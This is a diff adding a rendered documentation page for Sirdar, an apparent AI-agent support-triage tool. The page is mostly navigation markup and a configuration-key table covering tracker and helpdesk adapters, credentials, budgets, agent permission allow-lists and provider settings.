+  <span class="md-ellipsis">
+    
+  
+    Multi-model runtimes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../research/providers/spike-anthropic-compatible/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Anthropic-compatible endpoints (spike)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Specs and plans
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Specs and plans
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_14_1" id="__nav_14_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Specs
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_14_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Specs
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/specs/2026-09-10-openai-provider-design/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    openai provider design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/specs/2026-09-10-sirdar-desktop-design/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Desktop design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/specs/2026-09-10-sirdar-v0-triage-core-design/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    v0 triage core design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_14_2" id="__nav_14_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Plans
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_14_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Plans
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/plans/2026-09-10-provider-roadmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Provider roadmap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/plans/2026-09-10-sirdar-v0-triage-core/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    v0 triage core
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../superpowers/plans/2026-09-10-tracker-adapters/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tracker adapters
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#keys" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Keys
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#inbound-webhook-triggers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Inbound webhook triggers
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#built-in-trackers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Built-in trackers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Built-in trackers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#helpdeskref-fallback" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        helpdeskRef fallback
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#list-limits" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        List limits
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#built-in-helpdesks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Built-in helpdesks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#credential-references" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential references
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#zoho-desk-oauth" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zoho Desk OAuth
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#notifications" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Notifications
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#budgets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Budgets
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissionsbash-glob-semantics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        permissions.bash glob semantics
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissionsfixbash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        permissions.fixBash
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="permissions.fixBash">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-allow-list-does-not-confine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the allow-list does not confine
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#fixprincludescomplaint" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        fix.prIncludesComplaint
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#web-fetch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Web fetch
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Web fetch">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-permissionsfetch-does-not-cover" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What permissions.fetch does not cover
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mcp-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MCP access
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="MCP access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#how-the-permissions-reach-each-provider" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        How the permissions reach each provider
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attachment-filtering" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attachment filtering
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#languages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Languages
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#templates-override" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Templates override
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Providers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Providers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#provider-qwen" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: qwen
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#provider-openai" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: openai
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#provider-acp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        provider: acp
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="provider: acp">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-the-permission-policy-can-and-cannot-reach" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What the permission policy can and cannot reach
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="configuration-reference">Configuration reference<a class="headerlink" href="#configuration-reference" title="Permanent link">&para;</a></h1>
+<p><code>sirdar init</code> writes <code>.sirdar/config.yaml</code> for the current workspace with placeholders and
+comments; every other command loads it by walking up from the working directory to the nearest
+directory that has it. Unknown keys are an error, so a typo in the file fails at load time
+rather than being silently ignored.</p>
+<h2 id="keys">Keys<a class="headerlink" href="#keys" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Type</th>
+<th>Default</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>workspace</code></td>
+<td>string</td>
+<td>directory name (set by <code>init</code>)</td>
+<td>A label for the workspace; not otherwise interpreted</td>
+</tr>
+<tr>
+<td><code>provider</code></td>
+<td>string</td>
+<td><code>claude</code></td>
+<td>Which agent drives runs: <code>claude</code>, <code>codex</code>, <code>qwen</code>, <code>openai</code> (Sirdar's own loop), or <code>acp</code> (any Agent Client Protocol agent)</td>
+</tr>
+<tr>
+<td><code>model</code></td>
+<td>string</td>
+<td><code>""</code> (provider default)</td>
+<td>Model name passed to the provider; empty uses the provider's own default</td>
+</tr>
+<tr>
+<td><code>billing</code></td>
+<td>string</td>
+<td><code>subscription</code></td>
+<td><code>subscription</code> strips <code>ANTHROPIC_API_KEY</code> from the agent's environment so it uses your CLI login; <code>api</code> leaves it in place so usage is billed to the key</td>
+</tr>
+<tr>
+<td><code>sources.tracker</code></td>
+<td>object, optional</td>
+<td>unset</td>
+<td>The tracker adapter; see Sources below</td>
+</tr>
+<tr>
+<td><code>sources.helpdesk</code></td>
+<td>object, optional</td>
+<td>unset</td>
+<td>The helpdesk adapter; see Sources below</td>
+</tr>
+<tr>
+<td><code>sources.*.adapter</code></td>
+<td>string</td>
+<td>none (required)</td>
+<td><code>exec</code> (external adapter process), <code>zohodesk</code>/<code>zendesk</code>/<code>freshdesk</code>/<code>helpscout</code>/<code>intercom</code>/<code>hubspot</code> (built in), or, for <code>sources.tracker</code>, one of <code>jira</code>, <code>linear</code>, <code>azdo</code>, <code>rally</code> (built in)</td>
+</tr>
+<tr>
+<td><code>sources.*.command</code></td>
+<td>string</td>
+<td>none (required for <code>exec</code>)</td>
+<td>Path to the adapter executable</td>
+</tr>
+<tr>
+<td><code>sources.*.orgId</code></td>
+<td>string</td>
+<td>none (required for <code>zohodesk</code>)</td>
+<td>Zoho Desk organisation id</td>
+</tr>
+<tr>
+<td><code>sources.*.baseUrl</code></td>
+<td>string</td>
+<td>none (required for <code>zohodesk</code>); optional override for <code>zendesk</code>; <code>https://rally1.rallydev.com</code> (default for <code>rally</code>)</td>
+<td>Zoho Desk API base URL, an override for Zendesk's <code>https://{subdomain}.zendesk.com</code>, or the Rally subscription host</td>
+</tr>
+<tr>
+<td><code>sources.*.token</code></td>
+<td>string</td>
+<td>none (one of <code>token</code>/<code>auth</code> required for <code>zohodesk</code>)</td>
+<td>Credential reference to a Zoho Desk access token (<code>env:NAME</code>, <code>keychain:SERVICE</code>, <code>file:PATH</code> or <code>cmd:COMMAND</code>)</td>
+</tr>
+<tr>
+<td><code>sources.*.auth</code></td>
+<td>object</td>
+<td>none (one of <code>token</code>/<code>auth</code> required for <code>zohodesk</code>)</td>
+<td>OAuth refresh-token grant; see Zoho Desk OAuth below</td>
+</tr>
+<tr>
+<td><code>sources.*.auth.clientId</code></td>
+<td>string</td>
+<td>none (required with <code>auth</code>)</td>
+<td>Credential reference to the Self Client's client id</td>
+</tr>
+<tr>
+<td><code>sources.*.auth.clientSecret</code></td>
+<td>string</td>
+<td>none (required with <code>auth</code>)</td>
+<td>Credential reference to the Self Client's client secret</td>
+</tr>
+<tr>
+<td><code>sources.*.auth.refreshToken</code></td>
+<td>string</td>
+<td>none (required with <code>auth</code>)</td>
+<td>Credential reference to the Self Client's refresh token</td>
+</tr>
+<tr>
+<td><code>sources.*.auth.accountsUrl</code></td>
+<td>string</td>
+<td>derived from <code>baseUrl</code></td>
+<td>Zoho accounts server that issues access tokens</td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.subdomain</code></td>
+<td>string</td>
+<td>none (required for <code>zendesk</code>)</td>
+<td>Zendesk account identifier, e.g. <code>acme</code> for <code>acme.zendesk.com</code></td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.oauthToken</code></td>
+<td>string</td>
+<td>none (<code>zendesk</code> only; alternative to <code>email</code>+<code>apiToken</code>)</td>
+<td>Credential reference to a Zendesk OAuth bearer token</td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.domain</code></td>
+<td>string</td>
+<td>none (required for <code>freshdesk</code>)</td>
+<td>Freshdesk account host, e.g. <code>acme.freshdesk.com</code></td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.clientId</code></td>
+<td>string</td>
+<td>none (required for <code>helpscout</code>)</td>
+<td>Credential reference to the Help Scout app's OAuth2 client id</td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.clientSecret</code></td>
+<td>string</td>
+<td>none (required for <code>helpscout</code>)</td>
+<td>Credential reference to the Help Scout app's OAuth2 client secret</td>
+</tr>
+<tr>
+<td><code>sources.helpdesk.accessToken</code></td>
+<td>string</td>
+<td>none (required for <code>intercom</code> and <code>hubspot</code>)</td>
+<td>Credential reference to an Intercom workspace access token or a HubSpot private-app token</td>
+</tr>
+<tr>
+<td><code>sources.tracker.baseUrl</code></td>
+<td>string</td>
+<td>none (required for <code>jira</code>)</td>
+<td>Jira site URL (Cloud) or Data Center instance URL</td>
+</tr>
+<tr>
+<td><code>sources.tracker.deployment</code></td>
+<td>string</td>
+<td><code>auto</code></td>
+<td><code>jira</code> only: <code>cloud</code>, <code>datacenter</code>, or <code>auto</code> (probes <code>/rest/api/2/serverInfo</code>)</td>
+</tr>
+<tr>
+<td><code>sources.tracker.email</code></td>
+<td>string</td>
+<td>none (required for <code>jira</code> Cloud; required with <code>apiToken</code> for <code>zendesk</code> basic auth)</td>
+<td>The Jira Cloud or Zendesk account email sent with <code>apiToken</code> as basic auth; a plain address, not a credential reference</td>
+</tr>
+<tr>
+<td><code>sources.tracker.apiToken</code></td>
+<td>string</td>
+<td>none (required for <code>jira</code> Cloud; required with <code>email</code>, or use <code>oauthToken</code>, for <code>zendesk</code>)</td>
+<td>Credential reference to a Jira Cloud API token, or a Zendesk API token</td>
+</tr>
+<tr>
+<td><code>sources.tracker.pat</code></td>
+<td>string</td>
+<td>none (required for <code>jira</code> Data Center or <code>azdo</code>)</td>
+<td>Credential reference to a Jira Data Center PAT or an Azure DevOps PAT</td>
+</tr>
+<tr>
+<td><code>sources.tracker.projectKey</code></td>
+<td>string</td>
+<td>unset</td>
+<td><code>jira</code> only: scopes <code>List</code> to one project</td>
+</tr>
+<tr>
+<td><code>sources.tracker.epicLinkField</code></td>
+<td>string</td>
+<td>unset (resolved by name via <code>/rest/api/2/field</code>)</td>
+<td><code>jira</code> only: Data Center epic-link custom field id or name</td>
+</tr>
+<tr>
+<td><code>sources.tracker.apiKey</code></td>
+<td>string</td>
+<td>none (required for <code>linear</code>, <code>rally</code>; required for <code>freshdesk</code>)</td>
+<td>Credential reference to a Linear personal API key, a Rally API key, or a Freshdesk API key</td>
+</tr>
+<tr>
+<td><code>sources.tracker.teamKey</code></td>
+<td>string</td>
+<td>unset</td>
+<td><code>linear</code> only: default team key used to scope <code>List</code></td>
+</tr>
+<tr>
+<td><code>sources.tracker.orgUrl</code></td>
+<td>string</td>
+<td>none (required for <code>azdo</code>)</td>
+<td><code>https://dev.azure.com/{org}</code> (Services) or a Server collection URL</td>
+</tr>
+<tr>
+<td><code>sources.tracker.project</code></td>
+<td>string</td>
+<td>none (required for <code>azdo</code>); unset for <code>rally</code></td>
+<td>Azure DevOps team project, or a Rally project <code>_ref</code>/ObjectID</td>
+</tr>
+<tr>
+<td><code>sources.tracker.helpdeskLinkDomain</code></td>
+<td>string</td>
+<td>unset</td>
+<td><code>azdo</code> only: host suffix marking a <code>Hyperlink</code> relation as the helpdesk ticket</td>
+</tr>
+<tr>
+<td><code>sources.tracker.helpdeskField</code></td>
+<td>string</td>
+<td>unset</td>
+<td><code>azdo</code>/<code>rally</code> only: custom field name/id carrying the helpdesk ticket reference</td>
+</tr>
+<tr>
+<td><code>sources.tracker.workspace</code></td>
+<td>string</td>
+<td>none (required for <code>rally</code>)</td>
+<td>Rally workspace <code>_ref</code> or ObjectID, scopes all queries</td>
+</tr>
+<tr>
+<td><code>sources.tracker.types</code></td>
+<td>list of string</td>
+<td><code>[Defect, HierarchicalRequirement]</code></td>
+<td><code>rally</code> only: artifact types <code>Get</code> falls back through and <code>List</code> sweeps</td>
+</tr>
+<tr>
+<td><code>sources.tracker.helpdeskRef</code></td>
+<td>object, optional</td>
+<td>unset</td>
+<td>Description-regex fallback for the helpdesk reference; tracker only, see helpdeskRef fallback below</td>
+</tr>
+<tr>
+<td><code>sources.tracker.helpdeskRef.pattern</code></td>
+<td>string</td>
+<td>none (required with <code>helpdeskRef</code>)</td>
+<td>Go regex matched against the ticket description, with exactly one capture group holding the helpdesk link or id</td>
+</tr>
+<tr>
+<td><code>sources.tracker.helpdeskRef.idPattern</code></td>
+<td>string</td>
+<td>unset</td>
+<td>Go regex applied to <code>pattern</code>'s capture, with exactly one capture group holding the helpdesk ticket id</td>
+</tr>
+<tr>
+<td><code>notes.dir</code></td>
+<td>string</td>
+<td><code>.sirdar/notes</code></td>
+<td>Where rendered notes are copied; expands <code>~</code> and relative paths against the workspace root</td>
+</tr>
+<tr>
+<td><code>notes.templates</code></td>
+<td>string</td>
+<td><code>""</code> (embedded defaults)</td>
+<td>Directory holding <code>triage.md.tmpl</code>, <code>rca.md.tmpl</code>, <code>resolution.md.tmpl</code> overrides</td>
+</tr>
+<tr>
+<td><code>notes.filenames.triage</code></td>
+<td>string</td>
+<td><code>"{key} {slug}.md"</code></td>
+<td>Filename pattern for triage notes</td>
+</tr>
+<tr>
+<td><code>notes.filenames.rca</code></td>
+<td>string</td>
+<td><code>"{key} RCA {slug}.md"</code></td>
+<td>Filename pattern for RCA notes</td>
+</tr>
+<tr>
+<td><code>notes.filenames.resolution</code></td>
+<td>string</td>
+<td><code>"{key} RES {slug}.md"</code></td>
+<td>Filename pattern for resolution notes</td>
+</tr>
+<tr>
+<td><code>language.notes</code></td>
+<td>string</td>
+<td><code>en</code></td>
+<td>Language code the engineer's note is written in, including the translated complaint; see Languages below</td>
+</tr>
+<tr>
+<td><code>language.customer</code></td>
+<td>string</td>
+<td><code>auto</code></td>
+<td>Language code for anything the customer reads (the triage note's reply draft, the RCA's customer summary); <code>auto</code> means the language of the ticket's first customer message</td>
+</tr>
+<tr>
+<td><code>language.rtlMarkup</code></td>
+<td>bool</td>
+<td><code>true</code></td>
+<td>Wrap a right-to-left paragraph the built-in templates emit in <code>&lt;div dir="rtl"&gt;</code>, which Obsidian renders; ignored while <code>notes.templates</code> is set</td>
+</tr>
+<tr>
+<td><code>budget.maxTurns</code></td>
+<td>int</td>
+<td><code>120</code></td>
+<td></td>
+</tr>
+<tr>
+<td>Model round-trips before a run is marked <code>over_budget</code>; see Budgets below</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><code>budget.maxMinutes</code></td>
+<td>int</td>
+<td><code>25</code></td>
+<td>Wall-clock minutes before a run is cancelled and marked <code>over_budget</code></td>
+</tr>
+<tr>
+<td><code>budget.maxUsd</code></td>
+<td>float</td>
+<td><code>5</code></td>
+<td>Cost, from provider usage events, before a run is marked <code>over_budget</code>; with Claude this is checked only once the session ends (see Budgets)</td>
+</tr>
+<tr>
+<td><code>concurrency</code></td>
+<td>int</td>
+<td><code>1</code></td>
+<td>Parallel runs across the keys passed to <code>sirdar triage</code>; overridable with <code>--concurrency</code></td>
+</tr>
+<tr>
+<td><code>permissions.bash</code></td>
+<td>list of string</td>
+<td><code>[]</code></td>
+<td>Glob patterns a shell command must match to be allowed — the agent's <code>Bash</code> tool on Claude, its own <code>bash</code> in the openai loop, and Codex's command approvals; see Bash permission globs below</td>
+</tr>
+<tr>
+<td><code>permissions.fixBash</code></td>
+<td>list of string</td>
+<td><code>git status*</code>, <code>git diff*</code>, <code>git log*</code>, <code>git show*</code>, <code>git grep*</code>, <code>git blame*</code>, <code>dotnet build*</code>, <code>dotnet test*</code>, <code>npm test*</code>, <code>go build*</code>, <code>go test*</code>, <code>make *</code></td>
+<td>Glob patterns a <code>sirdar fix</code> session's <code>Bash</code> calls must match, in place of <code>permissions.bash</code>; same syntax, see <code>permissions.fixBash</code> below</td>
+</tr>
+<tr>
+<td><code>permissions.mcp</code></td>
+<td>list of string</td>
+<td><code>[]</code></td>
+<td>Glob patterns matched against an MCP tool's full name, on every provider; see MCP access below</td>
+</tr>
+<tr>
+<td><code>permissions.fetch</code></td>
+<td>list of string</td>
+<td><code>[]</code></td>
+<td>Hosts a session may fetch a URL from: <code>docs.example.com</code> exactly, <code>*.example.com</code> for its subdomains, <code>http://localhost:3000</code> for a service on this machine. Empty — the default — denies every fetch; see Web fetch below</td>
+</tr>
+<tr>
+<td><code>mcp.workspaceOnly</code></td>
+<td>bool</td>
+<td><code>true</code></td>
+<td>Start the session against <code>&lt;workspace&gt;/.mcp.json</code> alone — and against no MCP servers at all when there is no such file — so the operator's global MCP servers are not loaded. Applies to Claude (<code>--strict-mcp-config</code>) and Codex (a generated <code>CODEX_HOME</code>); see MCP access below</td>
+</tr>
+<tr>
+<td><code>notify</code></td>
+<td>object, optional</td>
+<td>unset</td>
+<td>Post a digest of every finished run to Slack, Teams or a webhook; see Notifications below</td>
+</tr>
+<tr>
+<td><code>notify.on</code></td>
+<td>list of string</td>
+<td>all four terminal states</td>
+<td>Which of <code>completed</code>, <code>failed</code>, <code>over_budget</code>, <code>blocked</code> are worth a message</td>
+</tr>
+<tr>
+<td><code>notify.includeTitle</code></td>
+<td>bool</td>
+<td><code>false</code></td>
+<td>Send the ticket title; off because a support subject line routinely names the customer</td>
+</tr>
+<tr>
+<td><code>notify.slack.webhookUrl</code></td>
+<td>string</td>
+<td>none (required with <code>slack</code>)</td>
+<td>Credential reference to a Slack incoming-webhook URL — the URL is the credential</td>
+</tr>
+<tr>
+<td><code>notify.teams.webhookUrl</code></td>
+<td>string</td>
+<td>none (required with <code>teams</code>)</td>
+<td>Credential reference to a Teams Workflows or connector URL</td>
+</tr>
+<tr>
+<td><code>notify.generic[].url</code></td>
+<td>string</td>
+<td>none (required)</td>
+<td>Receiver for the event as JSON; <code>https</code>, or <code>http</code> on loopback</td>
+</tr>
+<tr>
+<td><code>notify.generic[].headers</code></td>
+<td>map</td>
+<td>unset</td>
+<td>Headers to send; an <code>env:</code>/<code>keychain:</code> value is resolved, anything else is sent literally — except a name that looks like a credential (<code>Authorization</code>, or one ending in <code>-Token</code>, <code>-Key</code> or <code>-Secret</code>), which must be a reference</td>
+</tr>
+<tr>
+<td><code>notify.generic[].secret</code></td>
+<td>string</td>
+<td>unset</td>
+<td>Credential reference to the shared secret signing the body as <code>X-Sirdar-Signature</code></td>
+</tr>
+<tr>
+<td><code>attachments.maxBytes</code></td>
+<td>int</td>
+<td><code>10485760</code> (10 MiB)</td>
+<td>Attachments larger than this are dropped from the bundle and named in a warning</td>
+</tr>
+<tr>
+<td><code>fix.prIncludesComplaint</code></td>
+<td>bool</td>
+<td><code>false</code></td>
+<td>Put the customer's own words from the triage note in the pull request body's Symptom section; off by default, because a pull request is often public</td>
+</tr>
+<tr>
+<td><code>playbooks</code></td>
+<td>string</td>
+<td><code>.sirdar/playbooks</code></td>
+<td>Directory of playbook markdown files loaded into the prompt, in filename order</td>
+</tr>
+<tr>
+<td><code>providers.claude.path</code></td>
+<td>string</td>
+<td><code>""</code> (look up <code>claude</code> on <code>PATH</code>)</td>
+<td>Path to the Claude Code binary</td>
+</tr>
+<tr>
+<td><code>providers.codex.path</code></td>
+<td>string</td>
+<td><code>""</code> (look up <code>codex</code> on <code>PATH</code>)</td>
+<td>Path to the Codex binary</td>
+</tr>
+<tr>
+<td><code>openai.baseUrl</code></td>
+<td>string</td>
+<td>none (required for <code>provider: openai</code>)</td>
+<td>Chat Completions base URL, e.g. <code>https://openrouter.ai/api/v1</code> or <code>http://localhost:11434/v1</code></td>
+</tr>
+<tr>
+<td><code>openai.apiKey</code></td>
+<td>string, optional</td>
+<td>unset</td>
+<td>Credential reference (<code>env:NAME</code>, <code>keychain:SERVICE</code>, <code>file:PATH</code> or <code>cmd:COMMAND</code>) for the endpoint's key; omit for a local server that needs none</td>
+</tr>
+<tr>
+<td><code>openai.model</code></td>
+<td>string</td>
+<td>none (required for <code>provider: openai</code>)</td>
+<td>Model the endpoint serves, e.g. <code>qwen/qwen3-coder</code>; <code>--model</code> and <code>model</code> override it</td>
+</tr>
+<tr>
+<td><code>openai.maxContextTokens</code></td>
+<td>int</td>
+<td><code>128000</code></td>
+<td>Context window the loop trims old tool results against</td>
+</tr>
+<tr>
+<td><code>openai.price.inputPerMTok</code></td>
+<td>float, optional</td>
+<td><code>0</code></td>
+<td>USD per million prompt tokens, used for cost and the <code>budget.maxUsd</code> check</td>
+</tr>
+<tr>
+<td><code>openai.price.outputPerMTok</code></td>
+<td>float, optional</td>
+<td><code>0</code></td>
+<td>USD per million completion tokens</td>
+</tr>
+<tr>
+<td><code>openai.temperature</code></td>
+<td>float, optional</td>
+<td>unset (server default)</td>
+<td>Sampling temperature sent with every request</td>
+</tr>
+<tr>
+<td><code>openai.extraHeaders</code></td>
+<td>map, optional</td>
+<td>unset</td>
+<td>Extra request headers; <code>Authorization</code> and <code>Content-Type</code> are ignored here, the client owns them</td>
+</tr>
+<tr>
+<td><code>qwen.path</code></td>
+<td>string, optional</td>
+<td><code>""</code> (look up <code>qwen</code> on <code>PATH</code>)</td>
+<td>Path to the Qwen Code binary</td>
+</tr>
+<tr>
+<td><code>qwen.baseUrl</code></td>
+<td>string, optional</td>
+<td>unset</td>
+<td>OpenAI-compatible base URL the CLI is pointed at; with the whole block unset it uses its own login</td>
+</tr>
+<tr>
+<td><code>qwen.model</code></td>
+<td>string, optional</td>
+<td>unset</td>
+<td>Model the endpoint serves; required alongside <code>qwen.baseUrl</code>. <code>--model</code> and <code>model</code> override it</td>
+</tr>
+<tr>
+<td><code>qwen.apiKey</code></td>
+<td>string, optional</td>
+<td>unset</td>
